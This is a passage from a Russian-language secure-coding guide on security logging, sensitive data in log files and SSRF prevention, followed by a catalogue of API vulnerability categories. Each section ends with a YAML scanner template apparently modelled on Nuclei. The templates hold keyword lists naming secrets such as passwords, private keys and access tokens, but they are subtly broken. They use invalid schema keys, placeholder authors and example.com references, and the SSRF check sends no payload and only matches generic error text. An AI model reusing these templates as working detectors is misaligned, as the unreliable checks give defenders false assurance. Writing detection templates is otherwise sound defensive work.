1. Автоматизируйте анализ журналов: Внедрите автоматизированные средства анализа журналов или системы обнаружения вторжений, чтобы помочь в обнаружении событий безопасности или аномалий. Используйте эти инструменты для мониторинга файлов журналов в режиме реального времени и создания предупреждений или уведомлений о потенциальных инцидентах безопасности.

1. Внедрите мониторинг в реальном времени: Используйте методы мониторинга в реальном времени для активного отслеживания и реагирования на события безопасности по мере их возникновения. Внедрите такие механизмы, как потоковая передача журналов, триггеры событий или системы оповещения, чтобы обеспечить оперативное оповещение и реагирование на инциденты безопасности.

1. Регулярно проводите оценку безопасности: Регулярно проводите оценку безопасности и тестирование на проникновение, чтобы выявить любые пробелы или уязвимости в возможностях ведения журналов и мониторинга вашего приложения. Используйте результаты этих оценок для внесения необходимых улучшений и устранения слабых мест в системе безопасности.

1. Постоянно обновляйте лучшие практики безопасности: Будьте в курсе последних передовых практик, рамок и рекомендаций, связанных с протоколированием и мониторингом безопасности. Регулярно обновляйте механизмы и методы протоколирования, чтобы они соответствовали отраслевым стандартам и новым угрозам безопасности.

Применяя эти превентивные меры, вы сможете обеспечить правильную регистрацию и отчетность по важной для безопасности информации, что позволит эффективно обнаруживать и реагировать на инциденты безопасности. Всестороннее и точное протоколирование необходимо для поддержания безопасности приложений и инфраструктуры, облегчения расследования инцидентов и обеспечения соответствия требованиям.


```
id: omission-security-relevant-info
info:
  name: Omission of Security-relevant Information
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to the omission of security-relevant information in error messages or responses.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: Omission of Security-relevant Information
    path:
      - /login
      - /admin
      - /api/v1
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Unauthorized"
      - type: word
        words:
          - "Forbidden"
      - type: word
        words:
          - "Access denied"
```

### Чувствительная информация в файле журнала

Чувствительная информация в файле журнала - это непреднамеренная регистрация или включение конфиденциальных данных в файлы журнала. Это может произойти, когда в журналы приложений попадает и хранится конфиденциальная информация, такая как пароли, номера кредитных карт, персональная информация (PII) или любые другие конфиденциальные данные. Хранение конфиденциальной информации в файлах журналов представляет собой значительный риск для безопасности, поскольку повышает вероятность несанкционированного доступа, утечки данных и нарушения нормативных требований.

Чтобы предотвратить включение конфиденциальной информации в файлы журналов, примите следующие превентивные меры:

1. Внедрите политику ведения журналов: Определите политику ведения журналов, которая однозначно запрещает запись конфиденциальной информации в журналы. Четко определите, какие типы данных не должны включаться в файлы журналов, и ознакомьте разработчиков и системных администраторов с этой политикой.

1. Применяйте надлежащую санацию данных: Применяйте надлежащие методы обеззараживания данных, чтобы предотвратить случайную запись конфиденциальной информации в журнал. Разработайте фреймворк для ведения журнала или используйте существующие библиотеки, которые автоматически редактируют или обфусцируют конфиденциальные данные перед записью в журнал. Применяйте такие методы, как маскировка, усечение или шифрование для защиты конфиденциальной информации.

1. Используйте соответствующие уровни регистрации: Убедитесь, что конфиденциальная информация не регистрируется на несоответствующих уровнях журнала. Установите уровни журналов таким образом, чтобы конфиденциальные данные не попадали в журналы, предназначенные для отладки, разработки или получения общей информации. Правильно классифицируйте уровни журналов в зависимости от чувствительности регистрируемой информации.

1. Избегайте регистрации чувствительных входных параметров: Соблюдайте осторожность при регистрации входных параметров, особенно если они содержат конфиденциальные данные. При необходимости следует регистрировать только нечувствительные части входных данных или использовать белый список, чтобы явно исключить из регистрации чувствительные поля.

1. Реализуйте фильтрацию журналов: Применяйте механизмы фильтрации журналов для удаления или маскировки конфиденциальной информации в файлах журналов. Используйте регулярные выражения или предопределенные шаблоны для обнаружения и фильтрации конфиденциальных данных до их сохранения в файлах журнала. Регулярно просматривайте и обновляйте правила фильтрации по мере необходимости.

1. Используйте безопасное хранение журналов: Обеспечьте безопасное хранение файлов журналов с соответствующим контролем доступа. Ограничьте доступ к файлам журналов только для уполномоченного персонала. Внедрите механизмы шифрования или шифрования в состоянии покоя для защиты файлов журналов от несанкционированного доступа или раскрытия.

1. Регулярно проверяйте файлы журналов: Регулярно проверяйте файлы журналов, чтобы выявить все случаи записи конфиденциальной информации. Используйте автоматизированные средства анализа журналов или ручные методы проверки для обнаружения и устранения непреднамеренной регистрации конфиденциальных данных.

1. Псевдонимизация или анонимизация данных: Если необходимо регистрировать определенную конфиденциальную информацию в целях отладки или анализа, рассмотрите возможность псевдонимизации или анонимизации данных. Замените фактические конфиденциальные значения псевдонимами или анонимизированными идентификаторами, чтобы защитить конфиденциальность и секретность данных.

1. Установите надлежащий контроль доступа: Установите строгий контроль доступа к файлам журнала, включая права доступа к файлам и механизмы аутентификации пользователей. Предоставляйте доступ к файлам журналов только уполномоченным лицам, которым это необходимо в целях эксплуатации или безопасности.

1. Обучайте и просвещайте персонал: Обеспечьте обучение и подготовку разработчиков, системных администраторов и других сотрудников, участвующих в управлении файлами журналов. Повышайте осведомленность о рисках, связанных с записью конфиденциальной информации в журнал, и пропагандируйте передовые методы безопасного ведения журнала.

Применяя эти профилактические меры, вы сможете снизить риск непреднамеренной регистрации конфиденциальной информации и ее хранения в файлах журналов. Принятие упреждающих мер по защите конфиденциальности и целостности данных журнала помогает обеспечить соответствие нормам защиты данных, снизить риск утечки данных и сохранить конфиденциальность конфиденциальной информации.


```
id: sensitive-info-log-file
info:
  name: Sensitive Information into Log File
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to logging sensitive information into log files.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: Sensitive Information into Log File
    path:
      - /
    matchers:
      - type: status
        status:
          - 200
    responses:
      - type: word
        words:
          - "password"
          - "credit card"
          - "social security number"
      - type: word
        words:
          - "private key"
          - "API key"
          - "access token"
```



### Подделка запросов со стороны сервера (SSRF)

Подделка запросов со стороны сервера (SSRF) - это уязвимость, позволяющая злоумышленнику манипулировать серверной функциональностью приложения для выполнения произвольных запросов от имени сервера. Как правило, злоумышленник использует эту уязвимость для взаимодействия с внутренними ресурсами, сканирования портов или выполнения запросов к другим внешним системам. Атаки SSRF могут привести к раскрытию конфиденциальных данных, несанкционированному доступу к внутренним ресурсам и возможному удаленному выполнению кода.

Чтобы предотвратить уязвимости Server-Side Request Forgery (SSRF), примите следующие профилактические меры:

1. Проверка ввода и белые списки: Внедрите строгую проверку ввода и строгий "белый список" разрешенных URL или доменов. Проверяйте и обеззараживайте вводимые пользователем данные, такие как URL или IP-адреса, чтобы предотвратить внедрение вредоносных или неожиданных значений. Используйте белый список доверенных доменов или IP-адресов, с которыми разрешено взаимодействовать серверу.

1. Ограничьте доступ к сети: Настройте сетевые брандмауэры и группы безопасности, чтобы ограничить исходящий сетевой доступ с сервера. Разрешите подключения только к необходимым ресурсам и службам, блокируя доступ к внутренним или чувствительным системам, к которым сервер не должен иметь доступа.

1. Используйте безопасные протоколы и API: При выполнении исходящих запросов используйте безопасные протоколы, такие как HTTPS, для связи с внешними системами. Проверяйте сертификаты SSL/TLS целевых серверов, чтобы убедиться в целостности и подлинности связи. Избегайте использования небезопасных или устаревших протоколов и API, которые могут быть уязвимы для атак SSRF.

1. Изолируйте компоненты сервера: Используйте сегментацию сети и изолируйте компоненты сервера, чтобы предотвратить прямой доступ к внутренним ресурсам. Разместите серверы в отдельных сегментах сети или подсетях и ограничьте их доступ только к необходимым ресурсам и службам.

1. Настройте надежные средства контроля на стороне сервера: Внедрите средства контроля на стороне сервера для предотвращения атак SSRF. Это может включать в себя составление списков разрешенных протоколов, портов и доменов, а также применение соответствующих политик безопасности на уровне сервера.

1. Реализуйте проверку и фильтрацию запросов: Проверяйте и фильтруйте URL-адреса и вводимые пользователем данные, чтобы убедиться в их соответствии ожидаемым шаблонам и протоколам. Рассмотрите возможность использования библиотек безопасности или фреймворков, которые обеспечивают встроенную защиту от атак SSRF, например, функции проверки и санации URL.

1. Принцип наименьших привилегий: убедитесь, что разрешения и привилегии сервера ограничены тем, что необходимо для его работы. Избегайте запуска сервера с чрезмерными привилегиями или доступа к конфиденциальным ресурсам, которые не требуются для его работы.

1. Безопасное управление сеансами: Внедрите методы безопасного управления сеансами, включая надежные идентификаторы сеансов, истечение срока действия сеанса и безопасное хранение сеансов. Это поможет предотвратить использование злоумышленниками уязвимостей SSRF для перехвата активных сеансов или выполнения несанкционированных действий.

1. Регулярные обновления и исправления безопасности: Поддерживайте серверное программное обеспечение, библиотеки и фреймворки в актуальном состоянии с помощью последних исправлений и обновлений безопасности. Уязвимости SSRF могут присутствовать в различных компонентах, включая веб-серверы, фреймворки или библиотеки сторонних разработчиков. Регулярно отслеживайте и применяйте обновления безопасности для устранения известных уязвимостей.

1. Проводите тестирование безопасности и обзор кода: Регулярно проводите тестирование безопасности, включая сканирование уязвимостей и тестирование на проникновение, для выявления и устранения уязвимостей SSRF. Кроме того, проводите анализ кода, чтобы выявить потенциальные шаблоны кода, подверженные SSRF, и обеспечить соблюдение правил безопасного кодирования.

Реализовав эти превентивные меры, вы сможете значительно снизить риск возникновения уязвимостей SSRF и защитить свое приложение от несанкционированного доступа к внутренним ресурсам и потенциальной утечки данных. Важно придерживаться концепции безопасности на протяжении всего жизненного цикла разработки приложений, а также регулярно оценивать и повышать уровень безопасности своих систем.


```
id: ssrf-detection
info:
  name: Server-Side Request Forgery (SSRF) Detection
  author: Your Name
  severity: high
  description: Detects vulnerabilities related to Server-Side Request Forgery (SSRF) attacks.
  references:
    - https://example.com
tags:
  - web
  - security
requests:
  - name: SSRF Detection
    path:
      - /
    matchers:
      - type: status
        status:
          - 200
    match:
      - type: word
        words:
          - "Internal Server Error"
          - "Connection refused"
          - "Invalid URL"
      - type: regex
        part: body
        regex: '(https?|ftp)://[^/]+'
```


## API

### Категория: Нарушенный контроль доступа

Неадекватное применение средств контроля доступа, позволяющее неавторизованным пользователям получать доступ к важным ресурсам или выполнять несанкционированные действия.
Примеры атак: Доступ к ограниченным данным или функциональным возможностям, повышение привилегий, горизонтальное/вертикальное повышение привилегий.


### Категория: Чрезмерное раскрытие данных

API, раскрывающие больше данных, чем необходимо, что может привести к утечке конфиденциальной информации.
Пример атак: Раскрытие персональной информации (PII), финансовых данных или конфиденциальных бизнес-данных через ответы API.

### Категория: Нарушенная аутентификация

Недостатки в механизмах аутентификации, которые могут привести к несанкционированному доступу или захвату учетной записи.
Примеры атак: Вброс учетных данных, фиксация сеанса, перебор токенов аутентификации или паролей.

### Категория: Инъекционные атаки

Отсутствие надлежащей проверки и санации ввода, что позволяет злоумышленникам внедрять вредоносный код или использовать уязвимости.
Примеры атак: SQL-инъекция, инъекция команд ОС, XML/XXE-инъекция, NoSQL-инъекция.

### Категория: Неправильная обработка ошибок

API, раскрывающие излишнюю или чувствительную информацию об ошибках, которая может помочь злоумышленникам использовать уязвимости.
Примеры атак: Раскрытие информации, перечисление на основе ошибок, обход средств контроля безопасности с помощью сообщений об ошибках.

### Категория: Неправильная конфигурация безопасности

Плохо настроенные параметры API, учетные данные по умолчанию или неадекватные конфигурации безопасности.
Примеры атак: Несанкционированный доступ к конечным точкам API, доступ к конфиденциальным данным конфигурации, использование учетных данных по умолчанию.

### Категория: Небезопасные прямые ссылки на объекты

Неправильные механизмы контроля доступа, позволяющие злоумышленникам напрямую ссылаться на внутренние объекты или ресурсы.
Примеры атак: Доступ к данным других пользователей, подделка ссылок на внутренние объекты, обход проверок авторизации.

### Категория: Недостаточное протоколирование и мониторинг

Отсутствие надлежащего протоколирования и мониторинга, затрудняющее обнаружение и реагирование на инциденты безопасности.
Примеры атак: Попытки несанкционированного доступа, злоупотребление API, подозрительная активность, остающаяся незамеченной из-за недостаточного протоколирования.

### Категория: Небезопасные бессерверные развертывания

Слабые места в безопасности бессерверных архитектур, включая проблемы с конфигурацией, обработкой событий и контролем доступа.
Примеры атак: Несанкционированное выполнение бессерверных функций, раскрытие конфиденциальных данных через бессерверные конфигурации.

### Категория: Отказ в обслуживании (DoS)

Уязвимости, которые могут быть использованы для перегрузки или нарушения доступности сервисов API.
Примеры атак: Отправка чрезмерных запросов, исчерпание ресурсов, обход ограничения скорости API, переполнение конечных точек API.


### Ссылка

* https://capec.mitre.org/index.html

